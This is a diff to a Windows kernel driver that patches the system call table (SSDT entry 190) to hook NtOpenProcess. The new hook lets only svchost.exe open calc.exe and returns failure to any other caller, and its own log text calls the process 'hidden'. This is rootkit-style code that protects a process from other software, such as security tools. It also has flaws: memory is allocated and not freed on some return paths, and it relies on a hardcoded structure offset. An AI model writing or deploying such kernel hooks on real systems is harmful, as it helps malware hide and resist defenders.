@@ -1,5 +1,6 @@
 #include <ntifs.h>
 #include <ntddk.h>
+#include <string.h>
 
 #define DeviceName L"\\Device\\hook"
 #define LnkDeviceName L"\\DosDevices\\hook" 
@@ -41,16 +42,86 @@ NTSTATUS
 NTAPI NtCreateFile(
 );
 
-typedef NTSTATUS (*NTCREATEFILE)(
+typedef NTSTATUS (*NTOPENPROCESS)(
+PHANDLE            ProcessHandle,
+ACCESS_MASK        DesiredAccess,
+POBJECT_ATTRIBUTES ObjectAttributes,
+PCLIENT_ID         ClientId
+	
 );
 
-NTCREATEFILE OldNtCreateFile;
+
+NTOPENPROCESS OldNtCreateFile;
+
 
 NTSTATUS  NewNtCreateFile(
+PHANDLE            ProcessHandle,
+ACCESS_MASK        DesiredAccess,
+POBJECT_ATTRIBUTES ObjectAttributes,
+PCLIENT_ID         ClientId
 )
 {
+	NTSTATUS status;
+	PEPROCESS pEproc;
+	NTSTATUS info;
+	char * name;
+	char * hide_proc = "calc.exe";
+	UNICODE_STRING unicode_hp;
+	int offset_name = 0x16c;
+	ULONG size;
+	PVOID procInfo;
+
+	RtlInitUnicodeString(&unicode_hp, L"\\Device\\HarddiskVolume2\\Windows\\System32\\calc.exe");
+
+	status = (NTSTATUS) (*OldNtCreateFile)(ProcessHandle, DesiredAccess, ObjectAttributes, ClientId);
+
+	info = ZwQueryInformationProcess(*ProcessHandle,27,NULL,0,&size);
+
+	if (info == STATUS_INFO_LENGTH_MISMATCH)
+	{
+		procInfo = ExAllocatePool(NonPagedPool, size);
+		if(procInfo == NULL)
+		{
+			DbgPrint("Error: ExAllocatePool\n");
+			return STATUS_UNSUCCESSFUL;
+		}
+		else{
+			info = ZwQueryInformationProcess(*ProcessHandle,27,procInfo,size,NULL);
+			if(NT_SUCCESS(info))
+			{
+				//DbgPrint("Process name: %wZ\n", procInfo);
+				//DbgPrint("Process name: %s\n", (char*)procInfo);
+				if(RtlCompareUnicodeString(&unicode_hp,procInfo,TRUE) == 0)
+				{
+					//DbgPrint("find process %s\n", hide_proc);
+					pEproc = IoGetCurrentProcess();
+					name = (PUCHAR) pEproc + offset_name;
+
+					if(strcmp(name,"svchost.exe") == 0)
+					{
+						DbgPrint("Process %s is hidden\n", hide_proc);
+						return status;
+					}
+					else{
+						//DbgPrint("Process %s is not open\n", hide_proc);
+						return STATUS_UNSUCCESSFUL;
+					}
+					
+				}
+			}
+			ExFreePool(procInfo);
+		}
+
+	}
+
+	return status;
 
 }
+
+
+
+
+
 
 
 NTSTATUS Hook_Function()
@@ -65,7 +136,7 @@ NTSTATUS Hook_Function()
 	MappedSystemCallTable=MmMapLockedPages(g_pmdlSystemCall, KernelMode);
 
 	__try{
-		OldNtCreateFile = (PVOID) InterlockedExchange( (PLONG) &MappedSystemCallTable[XXX], (LONG) NewNtCreateFile);
+		OldNtCreateFile = (PVOID) InterlockedExchange( (PLONG) &MappedSystemCallTable[190], (LONG) NewNtCreateFile);
 		IsHooked = 1;
 	}
 	__except(1){
@@ -79,7 +150,7 @@ void Unhook_fonction()
 {	
 	__try
 	{
-		InterlockedExchange( (PLONG) &MappedSystemCallTable[XXX], (LONG) OldNtCreateFile);
+		InterlockedExchange( (PLONG) &MappedSystemCallTable[190], (LONG) OldNtCreateFile);
 		IsHooked = 0;
 	}
 	__except(1){
